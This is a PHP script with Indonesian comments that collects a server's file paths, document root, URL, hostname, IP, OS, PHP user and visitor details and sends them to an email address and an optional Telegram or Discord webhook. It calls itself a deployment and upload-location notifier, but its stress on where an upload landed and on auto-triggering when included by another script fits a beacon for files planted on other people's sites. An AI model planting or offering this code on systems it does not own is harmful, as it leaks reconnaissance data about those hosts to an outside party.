<?php
/**
 * notify.php
 * ------------------------------------------------------------------
 * Skrip notifikasi lokasi upload.
 *
 * Cara kerja:
 *   Saat skrip ini diakses (atau di-include) di server, ia akan
 *   mengumpulkan informasi lokasi file (path absolut + URL) lalu
 *   mengirimkannya ke alamat email tujuan.
 *
 *   Berguna untuk:
 *   - Mengetahui di direktori mana sebuah file berhasil di-upload.
 *   - Verifikasi path setelah deployment.
 *   - Audit/inventori file pada hosting bersama.
 *
 * Cara pakai:
 *   1. Ubah konstanta MAIL_TO menjadi email Anda.
 *   2. Upload file ini ke server.
 *   3. Akses lewat browser:  https://domain.tld/path/notify.php
 *      (atau biarkan auto-trigger jika di-include skrip lain).
 *
 * Catatan keamanan:
 *   - Skrip ini HANYA mengirim informasi lokasi. Tidak menjalankan
 *     perintah shell, tidak membaca file lain, tidak membuka backdoor.
 *   - Hapus / pindahkan file setelah selesai dipakai.
 * ------------------------------------------------------------------
 */

// =============== KONFIGURASI ===============
const MAIL_TO       = 'email-anda@example.com';      // <-- WAJIB diubah
const MAIL_FROM     = 'no-reply@example.com';        // alamat pengirim
const MAIL_SUBJECT  = '[Notify] File di-upload di server';

// Opsional: kirim juga ke webhook (Telegram bot / Discord / dsb).
// Kosongkan ('') untuk menonaktifkan.
const WEBHOOK_URL   = '';

// Tampilkan halaman konfirmasi setelah email terkirim?
const SHOW_PAGE     = true;
// ===========================================


/**
 * Kumpulkan informasi lokasi & lingkungan.
 */
function collect_info(): array
{
    $scriptPath = __FILE__;
    $scriptDir  = __DIR__;

    // Bangun URL lengkap berdasarkan header server.
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
        || (($_SERVER['SERVER_PORT'] ?? '') === '443')
        ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'] ?? ($_SERVER['SERVER_NAME'] ?? 'unknown');
    $uri  = $_SERVER['REQUEST_URI'] ?? ($_SERVER['SCRIPT_NAME'] ?? '');
    $fullUrl = $scheme . '://' . $host . $uri;

    return [
        'Waktu (server)'   => date('Y-m-d H:i:s T'),
        'File path'        => $scriptPath,
        'Direktori'        => $scriptDir,
        'Document root'    => $_SERVER['DOCUMENT_ROOT'] ?? '(tidak ada)',
        'URL akses'        => $fullUrl,
        'Hostname'         => gethostname() ?: 'unknown',
        'Server IP'        => $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()),
        'Server software'  => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'PHP version'      => PHP_VERSION,
        'PHP SAPI'         => PHP_SAPI,
        'OS'               => php_uname(),
        'User PHP'         => function_exists('posix_getpwuid') && function_exists('posix_geteuid')
            ? (posix_getpwuid(posix_geteuid())['name'] ?? 'unknown')
            : (getenv('USER') ?: 'unknown'),
        'Pengunjung IP'    => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'User-Agent'       => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'Referer'          => $_SERVER['HTTP_REFERER'] ?? '(tidak ada)',
    ];
}

/**
 * Format informasi menjadi teks yang mudah dibaca.
 */
function format_body(array $info): string
{
    $lines = ["=== Notifikasi Lokasi Upload ===", ""];
    foreach ($info as $key => $val) {
        $lines[] = sprintf("%-16s : %s", $key, $val);
    }
    $lines[] = "";
    $lines[] = "-- Dikirim otomatis oleh notify.php";
    return implode("\n", $lines);
}

/**
 * Kirim email via fungsi mail() bawaan PHP.
 */
function send_email(string $body): bool
{
    if (!function_exists('mail')) {
        return false;
    }
    $headers  = "From: " . MAIL_FROM . "\r\n";
    $headers .= "Reply-To: " . MAIL_FROM . "\r\n";
    $headers .= "X-Mailer: PHP/" . PHP_VERSION . "\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    return @mail(MAIL_TO, MAIL_SUBJECT, $body, $headers);
}

/**
 * Kirim notifikasi tambahan ke webhook (POST JSON).
 */
function send_webhook(string $body): bool
{
    if (WEBHOOK_URL === '' || !function_exists('curl_init')) {
        return false;
    }
    $payload = json_encode(['content' => $body, 'text' => $body], JSON_UNESCAPED_SLASHES);
    $ch = curl_init(WEBHOOK_URL);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 8,
    ]);
    $ok = curl_exec($ch) !== false;
    curl_close($ch);
    return $ok;
}

// =============== EKSEKUSI ===============
$info = collect_info();
$body = format_body($info);

$mailOk    = send_email($body);
$webhookOk = send_webhook($body);

// Halaman konfirmasi (opsional).
if (SHOW_PAGE) {
    header('Content-Type: text/html; charset=UTF-8');
    ?>
    <!doctype html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title>Notify</title>
        <style>
            body{font-family:system-ui,sans-serif;background:#0f172a;color:#e2e8f0;
                 max-width:780px;margin:40px auto;padding:0 20px;line-height:1.5}
            h1{color:#38bdf8} pre{background:#1e293b;padding:16px;border-radius:8px;
               overflow:auto;font-size:13px}
            .ok{color:#22c55e} .fail{color:#ef4444}
        </style>
    </head>
    <body>
        <h1>Notifikasi terkirim</h1>
        <p>
            Email: <span class="<?= $mailOk ? 'ok' : 'fail' ?>">
                <?= $mailOk ? 'BERHASIL' : 'GAGAL (mail() tidak tersedia / ditolak server)' ?>
            </span><br>
            Webhook: <?= WEBHOOK_URL === ''
                ? '<em>nonaktif</em>'
                : '<span class="' . ($webhookOk ? 'ok' : 'fail') . '">'
                  . ($webhookOk ? 'BERHASIL' : 'GAGAL') . '</span>' ?>
        </p>
        <h3>Isi pesan:</h3>
        <pre><?= htmlspecialchars($body, ENT_QUOTES, 'UTF-8') ?></pre>
    </body>
    </html>
    <?php
}
